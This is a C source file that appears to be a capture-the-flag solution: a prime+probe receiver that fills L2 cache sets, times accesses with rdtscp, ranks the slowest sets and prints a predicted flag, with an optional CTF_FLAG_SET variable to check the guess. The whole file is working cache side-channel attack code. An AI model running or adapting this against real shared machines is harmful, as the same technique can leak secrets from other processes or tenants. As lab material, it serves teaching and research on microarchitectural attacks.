#include "util.h"

#include <inttypes.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <time.h>
#include <unistd.h>

#ifndef MAP_POPULATE
#define MAP_POPULATE 0
#endif

#ifndef MAP_ANONYMOUS
#define MAP_ANONYMOUS MAP_ANON
#endif

#ifndef MAP_HUGETLB
#define MAP_HUGETLB 0
#endif

#define LINE_SIZE 64ULL
#define L2_SETS 1024
#define L2_WAYS 16
#define SET_STRIDE (L2_SETS * LINE_SIZE)
#define BUFF_SIZE (SET_STRIDE * L2_WAYS)

#define REPORT_INTERVAL_CYCLES 600000000ULL
#define PROBE_GAP_ITERS 20000ULL
#define MISS_THRESHOLD_CYCLES 80ULL
#define RATIO_MIN 40ULL
#define RATIO_MAX 100ULL
#define TOP_LIMIT 20

typedef struct {
    int set_id;
    uint64_t avg_cycles;
    uint64_t miss_lines;
    uint64_t ratio;
} ranked_set_t;

#if defined(__i386__) || defined(__x86_64__) || defined(_M_IX86) || defined(_M_X64)
static uint64_t now_cycles(void)
{
    unsigned int lo;
    unsigned int hi;
    unsigned int aux = 0;

    asm volatile("lfence\n\trdtscp"
                 : "=a"(lo), "=d"(hi), "=c"(aux)
                 : : "memory");
    return ((uint64_t)hi << 32) | lo;
}
#else
static uint64_t now_cycles(void)
{
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    return (uint64_t)ts.tv_sec * 1000000000ull + (uint64_t)ts.tv_nsec;
}
#endif

static void spin_until(uint64_t deadline)
{
    for (;;) {
#if defined(__i386__) || defined(__x86_64__) || defined(_M_IX86) || defined(_M_X64)
        asm volatile("lfence" : : : "memory");
#else
        asm volatile("" : : : "memory");
#endif
        if (now_cycles() >= deadline) {
            return;
        }
    }
}

static void *acquire_region(void)
{
    void *area = mmap(NULL, BUFF_SIZE, PROT_READ | PROT_WRITE,
                      MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB,
                      -1, 0);

    if (area == (void *)-1) {
        perror("mmap");
        exit(EXIT_FAILURE);
    }

    return area;
}

static void touch_region(void *area)
{
    volatile unsigned char *bytes = (volatile unsigned char *)area;
    bytes[0] = 1;
    for (uint64_t i = 0; i < BUFF_SIZE; i += LINE_SIZE) {
        bytes[i] = 1;
    }
}

static void prepare_set(void *area, int set_id, volatile unsigned char *sink)
{
    volatile unsigned char *bytes = (volatile unsigned char *)area;
    uint64_t set_base = (uint64_t)bytes + (uint64_t)set_id * LINE_SIZE;

    for (int way = 0; way < L2_WAYS; way++) {
        uint64_t addr = set_base + (uint64_t)way * SET_STRIDE;
        *sink = bytes[addr - (uint64_t)bytes];
    }
}

static uint64_t sample_set(void *area, int set_id, int *miss_count)
{
    volatile unsigned char *bytes = (volatile unsigned char *)area;
    uint64_t set_base = (uint64_t)bytes + (uint64_t)set_id * LINE_SIZE;
    uint64_t total = 0;
    int misses = 0;

    for (int way = 0; way < L2_WAYS; way++) {
        uint64_t addr = set_base + (uint64_t)way * SET_STRIDE;
        uint64_t lat = measure_one_block_access_time((uint64_t)(bytes + (addr - (uint64_t)bytes)));
        total += lat;
        if (lat > MISS_THRESHOLD_CYCLES) {
            misses++;
        }
    }

    *miss_count = misses;
    return total;
}

static int wait_for_enter(void)
{
    char line[2];
    return (fgets(line, sizeof(line), stdin) != NULL) ? 1 : 0;
}

static int parse_truth_value(void)
{
    const char *raw = getenv("CTF_FLAG_SET");
    if (!raw) {
        return -1;
    }
    return atoi(raw);
}

static void scan_epoch(void *area, volatile unsigned char *sink,
                       uint64_t *accum, uint64_t *samples, uint64_t *missed)
{
    for (int set_id = 0; set_id < L2_SETS; set_id++) {
        prepare_set(area, set_id, sink);
        spin_until(now_cycles() + PROBE_GAP_ITERS);
        int miss = 0;
        accum[set_id] += sample_set(area, set_id, &miss);
        missed[set_id] += (uint64_t)miss;
        samples[set_id]++;
    }
}

static int pick_top_sets(uint64_t *accum, uint64_t *samples, uint64_t *missed,
                        ranked_set_t *window)
{
    int picked = 0;
    memset(window, 0, TOP_LIMIT * sizeof(*window));

    for (int rank = 0; rank < TOP_LIMIT; rank++) {
        int best = -1;
        uint64_t top_avg = 0;

        for (int set_id = 0; set_id < L2_SETS; set_id++) {
            if (samples[set_id] == 0 || missed[set_id] == 0) {
                continue;
            }

            uint64_t avg = accum[set_id] / samples[set_id];
            uint64_t ratio = avg / missed[set_id];

            if (ratio < RATIO_MIN || ratio > RATIO_MAX) {
                continue;
            }

            if (avg > top_avg) {
                top_avg = avg;
                best = set_id;
            }
        }

        if (best < 0) {
            break;
        }

        window[picked].set_id = best;
        window[picked].avg_cycles = accum[best] / samples[best];
        window[picked].miss_lines = missed[best];
        window[picked].ratio = window[picked].avg_cycles / missed[best];
        picked++;
    }

    return picked;
}

static void dump_top_sets(const ranked_set_t *window, int count)
{
    for (int i = 0; i < count; i++) {
        printf("%-6d  %-14" PRIu64 "  %-12" PRIu64 "  %-10" PRIu64 "\n",
               window[i].set_id, window[i].avg_cycles, window[i].miss_lines, window[i].ratio);
    }
}

static int aggregate_epoch_top(const ranked_set_t *window, int count,
                              uint64_t *hit_board, uint64_t *top_avg,
                              uint64_t *top_miss, uint64_t *top_hits)
{
    int best_set = -1;
    uint64_t best_hits_local = 0;
    uint64_t best_avg_local = 0;
    uint64_t best_miss_local = 0;

    *top_hits = 0;
    *top_avg = 0;
    *top_miss = 0;

    for (int i = 0; i < count; i++) {
        int set_id = window[i].set_id;
        hit_board[set_id]++;

        if (hit_board[set_id] > best_hits_local ||
            (hit_board[set_id] == best_hits_local && window[i].avg_cycles > best_avg_local)) {
            best_hits_local = hit_board[set_id];
            best_set = set_id;
            best_avg_local = window[i].avg_cycles;
            best_miss_local = window[i].miss_lines;
        }
    }

    *top_hits = best_hits_local;
    *top_avg = best_avg_local;
    *top_miss = best_miss_local;
    return best_set;
}

static int select_global_winner(uint64_t *winner_hits, uint64_t *score_out)
{
    int best = 0;
    uint64_t score = winner_hits[0];

    for (int set_id = 1; set_id < L2_SETS; set_id++) {
        if (winner_hits[set_id] > score) {
            score = winner_hits[set_id];
            best = set_id;
        }
    }

    *score_out = score;
    return best;
}

static void clear_epoch_state(uint64_t *accum, uint64_t *samples, uint64_t *missed)
{
    memset(accum, 0, L2_SETS * sizeof(uint64_t));
    memset(samples, 0, L2_SETS * sizeof(uint64_t));
    memset(missed, 0, L2_SETS * sizeof(uint64_t));
}

int main(int argc, char **argv)
{
    (void)argc;
    (void)argv;
    setvbuf(stdout, NULL, _IOLBF, 0);

    void *region = acquire_region();
    volatile unsigned char sink = 0;
    touch_region(region);

    uint64_t *accum = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *samples = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *missed = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *winner_counts = calloc(L2_SETS, sizeof(uint64_t));
    uint64_t *top20_hits = calloc(L2_SETS, sizeof(uint64_t));

    if (!accum || !samples || !missed || !winner_counts || !top20_hits) {
        perror("calloc");
        exit(EXIT_FAILURE);
    }

    int truth = parse_truth_value();
    if (truth >= 0) {
        printf("Ground-truth enabled via CTF_FLAG_SET=%d (for local validation).\n", truth);
    }

    printf("Buffer at %p. Press Enter to start probing...\n", region);
    if (!wait_for_enter()) {
        free(accum);
        free(samples);
        free(missed);
        free(winner_counts);
        free(top20_hits);
        munmap(region, BUFF_SIZE);
        return 0;
    }

    uint64_t next_report = now_cycles() + REPORT_INTERVAL_CYCLES;
    uint64_t epoch = 0;

    for (;;) {
        scan_epoch(region, &sink, accum, samples, missed);

        if (now_cycles() >= next_report) {
            epoch++;
            ranked_set_t top20[TOP_LIMIT];
            int ranked_count = 0;
            uint64_t top_hits = 0, top_avg = 0, top_miss = 0;

            printf("\n=== Epoch %llu — top 20 hottest sets ===\n", (unsigned long long)epoch);
            printf("%-6s  %-14s  %-12s  %-10s\n", "set", "avg_probe_cyc", "miss_ways", "cyc/miss");

            ranked_count = pick_top_sets(accum, samples, missed, top20);
            dump_top_sets(top20, ranked_count);
            for (int i = 0; i < ranked_count; i++) {
                accum[top20[i].set_id] = 0;
                samples[top20[i].set_id] = 0;
                missed[top20[i].set_id] = 0;
            }

            int epoch_set = aggregate_epoch_top(top20, ranked_count,
                                               top20_hits, &top_avg, &top_miss, &top_hits);

            if (epoch_set >= 0) {
                winner_counts[epoch_set]++;
                uint64_t win_count = 0;
                int winner = select_global_winner(winner_counts, &win_count);

                printf("Epoch winner: set %d (top20_hits=%llu, avg=%llu, miss_ways=%llu, cyc/miss=%llu)\n",
                       epoch_set, (unsigned long long)top_hits,
                       (unsigned long long)top_avg, (unsigned long long)top_miss,
                       top_miss > 0 ? top_avg / top_miss : 0);
                printf("Predicted flag: %d\n", winner);
                printf("Flag candidate (most frequent winner): set %d with %llu/%llu epoch wins\n",
                       winner, (unsigned long long)win_count, (unsigned long long)epoch);

                if (truth >= 0) {
                    if (winner == truth) {
                        printf("Result matched expected set!\n");
                    } else {
                        printf("Expected set was %d\n", truth);
                    }
                }
            } else {
                printf("Epoch winner: none qualified (no sets within ratio band [%llu, %llu])\n",
                       (unsigned long long)RATIO_MIN, (unsigned long long)RATIO_MAX);
            }

            fflush(stdout);
            clear_epoch_state(accum, samples, missed);
            next_report = now_cycles() + REPORT_INTERVAL_CYCLES;
        }
    }

    return 0;
}
